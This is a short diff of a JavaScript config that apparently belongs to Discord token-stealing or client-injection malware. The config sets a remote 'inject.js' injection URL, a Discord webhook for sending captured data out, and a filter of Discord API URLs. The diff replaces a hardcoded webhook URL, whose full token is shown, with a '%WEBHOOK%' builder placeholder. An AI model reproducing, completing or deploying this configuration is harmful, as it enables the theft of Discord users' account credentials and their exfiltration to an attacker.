@@ -16,7 +16,7 @@ var config = {
     "embed-color": 374276,
 
     injection_url: "https://raw.githubusercontent.com/KaZerCfx/-ee/main/inject.js",
-    webhook: "https://discord.com/api/webhooks/1200143308983373934/wvbEj219eBeAVZA0gnCwaqZgRY8n_BNUqoRx3znTcPttmT7amDVODvZwKf6t0brVe-qZ",
+    webhook: "%WEBHOOK%",
     Filter: {
         "urls": [
             "https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json",
